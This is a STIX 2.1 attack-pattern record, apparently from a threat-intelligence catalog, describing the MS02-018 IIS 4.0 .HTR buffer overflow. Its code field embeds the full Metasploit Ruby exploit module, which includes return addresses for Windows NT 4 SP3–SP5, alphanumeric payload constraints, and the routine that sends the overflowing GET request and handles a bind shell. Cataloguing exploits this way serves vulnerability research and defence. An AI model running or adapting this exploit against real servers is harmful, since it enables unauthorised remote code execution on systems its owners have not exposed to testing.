{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--77e07bc1-d0ea-4ee0-a72c-59fadc725b72",
    "created": "2024-08-14T16:48:31.523074Z",
    "modified": "2024-08-14T16:48:31.523078Z",
    "name": "MS02-018 Microsoft IIS 4.0 .HTR Path Overflow",
    "description": " This exploits a buffer overflow in the ISAPI ISM.DLL used to process HTR scripting in IIS 4.0. This module works against Windows NT 4 Service Packs 3, 4, and 5. The server will continue to process requests until the payload being executed has exited. If you've set EXITFUNC to 'seh', the server will continue processing requests, but you will have trouble terminating a bind shell. If you set EXITFUNC to thread, the server will crash upon exit of the bind shell. The payload is alpha-numerically encoded without a NOP sled because otherwise the data gets mangled by the filters. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/iis/ms02_018_htr.rb",
            "external_id": "ms02_018_htr.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0874"
        },
        {
            "source_name": "reference",
            "url": "http://www.eeye.com/html/research/advisories/AD19990608.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS02-018 Microsoft IIS 4.0 .HTR Path Overflow',\n      'Description'    => %q{\n          This exploits a buffer overflow in the ISAPI ISM.DLL used to\n        process HTR scripting in IIS 4.0. This module works against\n        Windows NT 4 Service Packs 3, 4, and 5. The server will\n        continue to process requests until the payload being\n        executed has exited. If you've set EXITFUNC to 'seh', the\n        server will continue processing requests, but you will have\n        trouble terminating a bind shell. If you set EXITFUNC to\n        thread, the server will crash upon exit of the bind shell.\n        The payload is alpha-numerically encoded without a NOP sled\n        because otherwise the data gets mangled by the filters.\n      },\n      'Author'         => [ 'stinko' ],\n      'License'        => BSD_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '1999-0874'],\n          [ 'OSVDB', '3325'],\n          [ 'BID', '307'],\n          [ 'URL', 'http://www.eeye.com/html/research/advisories/AD19990608.html'],\n          [ 'MSB', 'MS02-018'],\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 2048,\n          'BadChars' => Rex::Text.charset_exclude(Rex::Text::AlphaNumeric),\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows NT 4.0 SP3', {'Platform' => 'win', 'Rets' => [ 593, 0x77f81a4d ] }],\n          ['Windows NT 4.0 SP4', {'Platform' => 'win', 'Rets' => [ 593, 0x77f7635d ] }],\n          ['Windows NT 4.0 SP5', {'Platform' => 'win', 'Rets' => [ 589, 0x77f76385 ] }],\n        ],\n      'DefaultOptions' => { 'AllowWin32SEH' => true }, # needed for pure alpha GetEIP stub\n      'DisclosureDate' => '2002-04-10',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(80)\n      ])\n  end\n\n  def exploit\n    connect\n\n    buf = 'X' * target['Rets'][0]\n    buf << [ target['Rets'][1] ].pack('V')\n    buf << payload.encoded\n\n    req = \"GET /#{buf}.htr HTTP/1.0\\r\\n\\r\\n\"\n    print_status(\"Trying target #{target.name} with jmp eax at 0x%.8x...\" % target['Rets'][1])\n    sock.put(req)\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2002-04-10",
    "x_mitre_platforms": [
        "win'"
    ]
}